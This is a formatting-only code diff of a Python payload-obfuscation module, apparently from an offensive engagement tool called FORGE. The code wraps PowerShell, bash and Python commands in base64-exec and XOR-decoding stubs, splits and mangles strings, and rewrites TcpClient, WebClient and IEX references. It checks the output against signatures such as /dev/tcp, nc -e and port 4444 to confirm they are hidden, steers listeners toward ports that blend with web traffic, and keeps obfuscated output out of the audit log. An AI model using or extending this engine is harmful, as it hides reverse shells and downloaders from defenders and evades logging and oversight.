@@ -22,6 +22,7 @@ Platform targets: powershell | bash | python | cmd
 OPSEC note: Obfuscated output is never logged or written to audit_log.
 Only the engagement DB payload record (sha256, encoding chain, stealth level) is persisted.
 """
+
 from __future__ import annotations
 
 import base64
@@ -32,30 +33,32 @@ from enum import Flag, auto
 
 # ── Obfuscation criterion flags ───────────────────────────────────────────────
 
+
 class ObfuscationCriterion(Flag):
     """Bit-flag enum; combine with | to select multiple criteria."""
-    VAR_MANGLE    = auto()   # Criterion 1
-    STRING_SPLIT  = auto()   # Criterion 2
-    ENCODING      = auto()   # Criterion 3
-    ENV_SUBSTITUTE= auto()   # Criterion 4
-    CMD_FRAGMENT  = auto()   # Criterion 5
-    CHAR_INSERT   = auto()   # Criterion 6
+
+    VAR_MANGLE = auto()  # Criterion 1
+    STRING_SPLIT = auto()  # Criterion 2
+    ENCODING = auto()  # Criterion 3
+    ENV_SUBSTITUTE = auto()  # Criterion 4
+    CMD_FRAGMENT = auto()  # Criterion 5
+    CHAR_INSERT = auto()  # Criterion 6
 
     # Named presets
-    MINIMAL  = VAR_MANGLE | STRING_SPLIT
+    MINIMAL = VAR_MANGLE | STRING_SPLIT
     STANDARD = VAR_MANGLE | STRING_SPLIT | ENCODING | CHAR_INSERT
-    FULL     = VAR_MANGLE | STRING_SPLIT | ENCODING | ENV_SUBSTITUTE | CMD_FRAGMENT | CHAR_INSERT
+    FULL = VAR_MANGLE | STRING_SPLIT | ENCODING | ENV_SUBSTITUTE | CMD_FRAGMENT | CHAR_INSERT
 
 
 # ── Evasion hard-block patterns ───────────────────────────────────────────────
 
 _BANNED_PATTERNS: list[re.Pattern[str]] = [
-    re.compile(r"TCPClient",      re.IGNORECASE),
+    re.compile(r"TCPClient", re.IGNORECASE),
     re.compile(r"/dev/tcp"),
-    re.compile(r"nc\s+-e",        re.IGNORECASE),
+    re.compile(r"nc\s+-e", re.IGNORECASE),
     re.compile(r"\b4444\b"),
-    re.compile(r"cmd\.exe\s+/c",  re.IGNORECASE),
-    re.compile(r"wget\b",         re.IGNORECASE),   # raw downloader signature
+    re.compile(r"cmd\.exe\s+/c", re.IGNORECASE),
+    re.compile(r"wget\b", re.IGNORECASE),  # raw downloader signature
 ]
 
 # Ports FORGE considers "stealth" (blend with web traffic)
@@ -67,8 +70,7 @@ def _assert_no_banned_patterns(text: str) -> None:
     for pat in _BANNED_PATTERNS:
         if pat.search(text):
             raise ValueError(
-                f"Evasion invariant violated: pattern {pat.pattern!r} "
-                f"found in obfuscated output."
+                f"Evasion invariant violated: pattern {pat.pattern!r} found in obfuscated output."
             )
 
 
@@ -80,7 +82,7 @@ _RAND = random.SystemRandom()
 def _rand_var(length: int = 8) -> str:
     """Return a random alphanumeric variable name starting with a letter."""
     first = _RAND.choice(string.ascii_letters)
-    rest  = "".join(_RAND.choices(string.ascii_letters + string.digits, k=length - 1))
+    rest = "".join(_RAND.choices(string.ascii_letters + string.digits, k=length - 1))
     return first + rest
 
 
@@ -99,7 +101,7 @@ def _split_string(s: str, min_chunk: int = 2, max_chunk: int = 5) -> list[str]:
     i = 0
     while i < len(s):
         size = _RAND.randint(min_chunk, max_chunk)
-        chunks.append(s[i:i + size])
+        chunks.append(s[i : i + size])
         i += size
     return chunks
 
@@ -158,7 +160,7 @@ def _base64_wrap_bash(raw: str) -> str:
 def _base64_wrap_python(raw: str) -> str:
     """Wrap Python snippet in exec(base64.b64decode(...).decode())."""
     encoded = base64.b64encode(raw.encode()).decode()
-    return f'python3 -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+    return f"python3 -c \"import base64;exec(base64.b64decode('{encoded}').decode())\""
 
 
 def _xor_wrap_powershell(raw: str, key: int | None = None) -> tuple[str, int]:
@@ -169,7 +171,7 @@ def _xor_wrap_powershell(raw: str, key: int | None = None) -> tuple[str, int]:
     if key is None:
         key = _RAND.randint(1, 255)
     xor_bytes = bytes(b ^ key for b in raw.encode())
-    hex_str   = xor_bytes.hex()
+    hex_str = xor_bytes.hex()
     v1, v2, v3 = _rand_var(), _rand_var(), _rand_var()
     stub = (
         f"${v1}=[byte[]]([System.Convert]::FromHexString('{hex_str}'));"
@@ -182,14 +184,15 @@ def _xor_wrap_powershell(raw: str, key: int | None = None) -> tuple[str, int]:
 
 # ── Per-platform criterion implementations ────────────────────────────────────
 
+
 class _PowerShellObfuscator:
     """Applies obfuscation criteria to a PowerShell command string."""
 
     def apply(
         self,
-        raw:      str,
+        raw: str,
         criteria: ObfuscationCriterion,
-        xor_key:  int | None = None,
+        xor_key: int | None = None,
     ) -> str:
         out = raw
 
@@ -235,9 +238,9 @@ class _PowerShellObfuscator:
                 "$_t=[System.Type]::GetType($_a+$_b+$_c);"
             ),
             "Net.Sockets.TcpClient": "$_t=[System.Type]::GetType('System.Net.Sockets.Tcp'+'Client');",
-            "System.Net.WebClient":  "$_wc=New-Object('System.Net.Web'+'Client');",
-            "IEX":  "Invoke-Expression",
-            "iex":  "& ([scriptblock]::Create(",
+            "System.Net.WebClient": "$_wc=New-Object('System.Net.Web'+'Client');",
+            "IEX": "Invoke-Expression",
+            "iex": "& ([scriptblock]::Create(",
         }
         for literal, replacement in replacements.items():
             if literal in code:
@@ -247,8 +250,9 @@ class _PowerShellObfuscator:
     @staticmethod
     def _split_string_literals(code: str) -> str:
         """Split quoted string literals into ('a'+'bc'+'d') form."""
+
         def replace_match(m: re.Match[str]) -> str:
-            s      = m.group(1)
+            s = m.group(1)
             chunks = _split_string(s, 2, 4)
             joined = "+".join(f"'{c}'" for c in chunks)
             return f"({joined})"
@@ -296,20 +300,24 @@ class _BashObfuscator:
     def _mangle_vars(code: str) -> str:
         """Replace common shell variable names with random counterparts."""
         var_map: dict[str, str] = {}
+
         def replace(m: re.Match[str]) -> str:
             name = m.group(1)
             if name not in var_map:
                 var_map[name] = _rand_var(6)
             return f"${var_map[name]}"
+
         return re.sub(r"\$([a-zA-Z_][a-zA-Z0-9_]{2,})", replace, code)
 
     @staticmethod
     def _split_literals(code: str) -> str:
         """Split double-quoted strings using adjacent-string concatenation."""
+
         def replace_match(m: re.Match[str]) -> str:
-            s      = m.group(1)
+            s = m.group(1)
             chunks = _split_string(s, 3, 6)
             return '"' + '"'.join(chunks) + '"'
+
         return re.sub(r'"([^"]{8,})"', replace_match, code)
 
     @staticmethod
@@ -349,13 +357,15 @@ class _PythonObfuscator:
     @staticmethod
     def _split_literals(code: str) -> str:
         def replace_match(m: re.Match[str]) -> str:
-            s      = m.group(1)
+            s = m.group(1)
             chunks = _split_string(s, 3, 6)
             return '"' + '""'.join(chunks) + '"'
+
         return re.sub(r'"([^"]{8,})"', replace_match, code)
 
 
 # ── Public engine ─────────────────────────────────────────────────────────────
+
 
 class ObfuscationEngine:
     """
@@ -372,17 +382,17 @@ class ObfuscationEngine:
     """
 
     def __init__(self) -> None:
-        self._ps  = _PowerShellObfuscator()
+        self._ps = _PowerShellObfuscator()
         self._bash = _BashObfuscator()
-        self._py  = _PythonObfuscator()
+        self._py = _PythonObfuscator()
 
     def obfuscate(
         self,
-        raw:      str,
-        target:   str,
+        raw: str,
+        target: str,
         criteria: ObfuscationCriterion = ObfuscationCriterion.STANDARD,
-        xor_key:  int | None = None,
-        lport:    int | None = None,
+        xor_key: int | None = None,
+        lport: int | None = None,
     ) -> ObfuscationResult:
         """
         Apply obfuscation criteria to `raw` for the given `target` platform.
@@ -402,6 +412,7 @@ class ObfuscationEngine:
         """
         if lport is not None and lport not in STEALTH_PORTS:
             import logging
+
             logging.getLogger(__name__).warning(
                 "Port %d is non-standard. Use 443/80/8443 to blend with HTTPS traffic.",
                 lport,
@@ -416,7 +427,11 @@ class ObfuscationEngine:
             obfuscated = self._py.apply(raw, criteria)
         else:
             # cmd / generic: minimal char insertion only
-            obfuscated = _insert_inert_chars(raw, "cmd") if ObfuscationCriterion.CHAR_INSERT in criteria else raw
+            obfuscated = (
+                _insert_inert_chars(raw, "cmd")
+                if ObfuscationCriterion.CHAR_INSERT in criteria
+                else raw
+            )
 
         violations = self._scan_violations(obfuscated)
         if violations:
@@ -438,9 +453,9 @@ class ObfuscationResult:
     __slots__ = ("target", "text", "violations")
 
     def __init__(self, text: str, violations: list[str], target: str) -> None:
-        self.text       = text
+        self.text = text
         self.violations = violations
-        self.target     = target
+        self.target = target
 
     @property
     def is_clean(self) -> bool:
